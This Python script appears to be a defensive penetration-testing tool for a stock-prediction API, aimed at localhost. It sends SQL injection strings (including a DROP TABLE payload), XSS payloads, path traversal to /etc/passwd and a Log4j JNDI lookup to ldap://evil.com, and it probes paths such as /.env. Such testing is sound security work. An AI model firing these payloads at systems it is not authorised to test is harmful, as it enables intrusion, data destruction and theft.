#!/usr/bin/env python3
"""
Penetration Testing Script for Stock Prediction System
Advanced security testing with OWASP Top 10 focus
"""

import requests
import json
import time
import random
import string
import hashlib
import base64
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import argparse
import sys
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('penetration_test.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SecurityTester:
    def __init__(self, base_url="http://localhost:8000", max_workers=10):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecurityTester/1.0 (Penetration Testing)'
        })
        self.max_workers = max_workers
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'target': base_url,
            'tests': [],
            'vulnerabilities': [],
            'summary': {
                'total_tests': 0,
                'passed': 0,
                'failed': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }
    
    def add_result(self, test_name, status, severity='info', details=None, vulnerability=False):
        """Add test result to the results dictionary"""
        result = {
            'test': test_name,
            'status': status,
            'severity': severity,
            'timestamp': datetime.now().isoformat(),
            'details': details or {}
        }
        
        self.results['tests'].append(result)
        self.results['summary']['total_tests'] += 1
        
        if status == 'PASS':
            self.results['summary']['passed'] += 1
        else:
            self.results['summary']['failed'] += 1
            
        if vulnerability:
            self.results['vulnerabilities'].append(result)
            self.results['summary'][severity] += 1
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        logger.info("Testing SQL injection vulnerabilities...")
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM information_schema.tables --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1; WAITFOR DELAY '00:00:05' --"
        ]
        
        endpoints = [
            '/api/v1/stocks',
            '/api/v1/predictions',
            '/api/v1/news',
            '/api/v1/user/login',
            '/api/v1/search'
        ]
        
        vulnerabilities_found = []
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    # Test GET parameters
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={'symbol': payload, 'id': payload}
                    )
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql syntax',
                        'mysql_fetch',
                        'ora-',
                        'postgresql',
                        'sqlite_',
                        'sqlstate',
                        'syntax error',
                        'unclosed quotation mark'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text:
                            vulnerabilities_found.append({
                                'endpoint': endpoint,
                                'payload': payload,
                                'response_code': response.status_code,
                                'error_indicator': indicator
                            })
                            break
                    
                    # Test POST data
                    if endpoint in ['/api/v1/user/login', '/api/v1/feedback']:
                        post_response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json={'username': payload, 'password': payload}
                        )
                        
                        post_text = post_response.text.lower()
                        for indicator in error_indicators:
                            if indicator in post_text:
                                vulnerabilities_found.append({
                                    'endpoint': endpoint,
                                    'method': 'POST',
                                    'payload': payload,
                                    'response_code': post_response.status_code,
                                    'error_indicator': indicator
                                })
                                break
                
                except Exception as e:
                    logger.warning(f"Error testing SQL injection on {endpoint}: {e}")
        
        if vulnerabilities_found:
            self.add_result(
                'SQL Injection Test',
                'FAIL',
                'critical',
                {'vulnerabilities': vulnerabilities_found},
                vulnerability=True
            )
        else:
            self.add_result('SQL Injection Test', 'PASS', 'info')
    
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        logger.info("Testing XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>"
        ]
        
        endpoints = [
            '/api/v1/feedback',
            '/api/v1/search',
            '/api/v1/user/profile'
        ]
        
        vulnerabilities_found = []
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    # Test reflected XSS
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={'q': payload, 'search': payload}
                    )
                    
                    if payload in response.text and 'text/html' in response.headers.get('content-type', ''):
                        vulnerabilities_found.append({
                            'type': 'Reflected XSS',
                            'endpoint': endpoint,
                            'payload': payload,
                            'response_code': response.status_code
                        })
                    
                    # Test stored XSS
                    if endpoint == '/api/v1/feedback':
                        post_response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json={'message': payload, 'rating': 5}
                        )
                        
                        # Check if payload is stored and reflected
                        get_response = self.session.get(f"{self.base_url}/api/v1/feedback")
                        if payload in get_response.text:
                            vulnerabilities_found.append({
                                'type': 'Stored XSS',
                                'endpoint': endpoint,
                                'payload': payload,
                                'response_code': post_response.status_code
                            })
                
                except Exception as e:
                    logger.warning(f"Error testing XSS on {endpoint}: {e}")
        
        if vulnerabilities_found:
            self.add_result(
                'XSS Vulnerability Test',
                'FAIL',
                'high',
                {'vulnerabilities': vulnerabilities_found},
                vulnerability=True
            )
        else:
            self.add_result('XSS Vulnerability Test', 'PASS', 'info')
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        logger.info("Testing authentication bypass...")
        
        bypass_attempts = []
        
        # Test JWT manipulation
        try:
            # Try to access protected endpoints without token
            protected_endpoints = [
                '/api/v1/user/profile',
                '/api/v1/admin/users',
                '/api/v1/predictions/create'
            ]
            
            for endpoint in protected_endpoints:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    bypass_attempts.append({
                        'type': 'No Authentication Required',
                        'endpoint': endpoint,
                        'response_code': response.status_code
                    })
            
            # Test with invalid JWT tokens
            invalid_tokens = [
                'Bearer invalid_token',
                'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid',
                'Bearer null',
                'Bearer undefined'
            ]
            
            for token in invalid_tokens:
                headers = {'Authorization': token}
                for endpoint in protected_endpoints:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers
                    )
                    if response.status_code == 200:
                        bypass_attempts.append({
                            'type': 'Invalid Token Accepted',
                            'endpoint': endpoint,
                            'token': token,
                            'response_code': response.status_code
                        })
        
        except Exception as e:
            logger.warning(f"Error testing authentication bypass: {e}")
        
        if bypass_attempts:
            self.add_result(
                'Authentication Bypass Test',
                'FAIL',
                'critical',
                {'bypass_attempts': bypass_attempts},
                vulnerability=True
            )
        else:
            self.add_result('Authentication Bypass Test', 'PASS', 'info')
    
    def test_rate_limiting(self):
        """Test rate limiting implementation"""
        logger.info("Testing rate limiting...")
        
        endpoint = '/api/v1/health'
        requests_count = 100
        time_window = 60  # seconds
        
        start_time = time.time()
        responses = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for i in range(requests_count):
                future = executor.submit(self.session.get, f"{self.base_url}{endpoint}")
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    response = future.result(timeout=5)
                    responses.append(response.status_code)
                except Exception as e:
                    responses.append(0)  # Error response
        
        end_time = time.time()
        duration = end_time - start_time
        
        rate_limited = responses.count(429)  # Too Many Requests
        success_rate = responses.count(200) / len(responses) * 100
        
        details = {
            'requests_sent': requests_count,
            'duration': duration,
            'rate_limited_responses': rate_limited,
            'success_rate': success_rate,
            'responses_distribution': {str(code): responses.count(code) for code in set(responses)}
        }
        
        if rate_limited == 0 and success_rate > 90:
            self.add_result(
                'Rate Limiting Test',
                'FAIL',
                'medium',
                details,
                vulnerability=True
            )
        else:
            self.add_result('Rate Limiting Test', 'PASS', 'info', details)
    
    def test_cors_configuration(self):
        """Test CORS configuration"""
        logger.info("Testing CORS configuration...")
        
        malicious_origins = [
            'http://malicious-site.com',
            'https://evil.com',
            'null',
            'file://'
        ]
        
        cors_issues = []
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.options(
                    f"{self.base_url}/api/v1/stocks",
                    headers=headers
                )
                
                cors_header = response.headers.get('Access-Control-Allow-Origin')
                if cors_header == '*' or cors_header == origin:
                    cors_issues.append({
                        'origin': origin,
                        'allowed': cors_header,
                        'response_code': response.status_code
                    })
            
            except Exception as e:
                logger.warning(f"Error testing CORS with origin {origin}: {e}")
        
        if cors_issues:
            self.add_result(
                'CORS Configuration Test',
                'FAIL',
                'medium',
                {'cors_issues': cors_issues},
                vulnerability=True
            )
        else:
            self.add_result('CORS Configuration Test', 'PASS', 'info')
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        logger.info("Testing information disclosure...")
        
        disclosure_issues = []
        
        # Test for sensitive endpoints
        sensitive_endpoints = [
            '/.env',
            '/config.json',
            '/api/v1/debug',
            '/admin',
            '/phpinfo.php',
            '/server-status',
            '/api/docs',
            '/swagger.json',
            '/openapi.json'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    disclosure_issues.append({
                        'endpoint': endpoint,
                        'response_code': response.status_code,
                        'content_length': len(response.text)
                    })
            
            except Exception as e:
                logger.warning(f"Error testing {endpoint}: {e}")
        
        # Test for verbose error messages
        try:
            response = self.session.get(f"{self.base_url}/api/v1/nonexistent")
            if any(keyword in response.text.lower() for keyword in 
                   ['traceback', 'stack trace', 'debug', 'exception', 'error details']):
                disclosure_issues.append({
                    'type': 'Verbose Error Messages',
                    'endpoint': '/api/v1/nonexistent',
                    'response_code': response.status_code
                })
        
        except Exception as e:
            logger.warning(f"Error testing verbose errors: {e}")
        
        if disclosure_issues:
            self.add_result(
                'Information Disclosure Test',
                'FAIL',
                'medium',
                {'disclosure_issues': disclosure_issues},
                vulnerability=True
            )
        else:
            self.add_result('Information Disclosure Test', 'PASS', 'info')
    
    def test_input_validation(self):
        """Test input validation and sanitization"""
        logger.info("Testing input validation...")
        
        validation_issues = []
        
        # Test with various malicious inputs
        malicious_inputs = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '${jndi:ldap://evil.com/a}',  # Log4j
            '{{7*7}}',  # Template injection
            '${7*7}',   # Expression injection
            'file:///etc/passwd',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        endpoints = [
            '/api/v1/stocks',
            '/api/v1/predictions',
            '/api/v1/search'
        ]
        
        for endpoint in endpoints:
            for malicious_input in malicious_inputs:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={'symbol': malicious_input}
                    )
                    
                    # Check if malicious input is reflected without sanitization
                    if malicious_input in response.text:
                        validation_issues.append({
                            'endpoint': endpoint,
                            'input': malicious_input,
                            'response_code': response.status_code,
                            'issue': 'Input not sanitized'
                        })
                
                except Exception as e:
                    logger.warning(f"Error testing input validation: {e}")
        
        if validation_issues:
            self.add_result(
                'Input Validation Test',
                'FAIL',
                'high',
                {'validation_issues': validation_issues},
                vulnerability=True
            )
        else:
            self.add_result('Input Validation Test', 'PASS', 'info')
    
    def test_security_headers(self):
        """Test for security headers"""
        logger.info("Testing security headers...")
        
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': None,  # Should exist
            'Content-Security-Policy': None,    # Should exist
            'Referrer-Policy': None            # Should exist
        }
        
        missing_headers = []
        
        try:
            response = self.session.get(f"{self.base_url}/api/v1/health")
            
            for header, expected_value in required_headers.items():
                actual_value = response.headers.get(header)
                
                if not actual_value:
                    missing_headers.append({
                        'header': header,
                        'status': 'missing'
                    })
                elif expected_value and isinstance(expected_value, list):
                    if actual_value not in expected_value:
                        missing_headers.append({
                            'header': header,
                            'expected': expected_value,
                            'actual': actual_value,
                            'status': 'incorrect_value'
                        })
                elif expected_value and actual_value != expected_value:
                    missing_headers.append({
                        'header': header,
                        'expected': expected_value,
                        'actual': actual_value,
                        'status': 'incorrect_value'
                    })
        
        except Exception as e:
            logger.warning(f"Error testing security headers: {e}")
        
        if missing_headers:
            self.add_result(
                'Security Headers Test',
                'FAIL',
                'medium',
                {'missing_headers': missing_headers},
                vulnerability=True
            )
        else:
            self.add_result('Security Headers Test', 'PASS', 'info')
    
    def run_all_tests(self):
        """Run all security tests"""
        logger.info("Starting comprehensive penetration testing...")
        
        tests = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_authentication_bypass,
            self.test_rate_limiting,
            self.test_cors_configuration,
            self.test_information_disclosure,
            self.test_input_validation,
            self.test_security_headers
        ]
        
        for test in tests:
            try:
                test()
            except Exception as e:
                logger.error(f"Error running {test.__name__}: {e}")
                self.add_result(
                    test.__name__.replace('test_', '').replace('_', ' ').title(),
                    'ERROR',
                    'info',
                    {'error': str(e)}
                )
        
        logger.info("Penetration testing completed")
    
    def generate_report(self, output_file='penetration_test_report.json'):
        """Generate detailed security report"""
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        logger.info(f"Security report generated: {output_file}")
        
        # Print summary
        summary = self.results['summary']
        print("\n" + "="*50)
        print("PENETRATION TESTING SUMMARY")
        print("="*50)
        print(f"Total Tests: {summary['total_tests']}")
        print(f"Passed: {summary['passed']}")
        print(f"Failed: {summary['failed']}")
        print(f"\nVulnerabilities Found:")
        print(f"Critical: {summary['critical']}")
        print(f"High: {summary['high']}")
        print(f"Medium: {summary['medium']}")
        print(f"Low: {summary['low']}")
        print("="*50)
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description='Stock Prediction System Penetration Testing')
    parser.add_argument('--url', default='http://localhost:8000', help='Target URL')
    parser.add_argument('--output', default='penetration_test_report.json', help='Output file')
    parser.add_argument('--workers', type=int, default=10, help='Max concurrent workers')
    
    args = parser.parse_args()
    
    tester = SecurityTester(args.url, args.workers)
    tester.run_all_tests()
    tester.generate_report(args.output)

if __name__ == '__main__':
    main()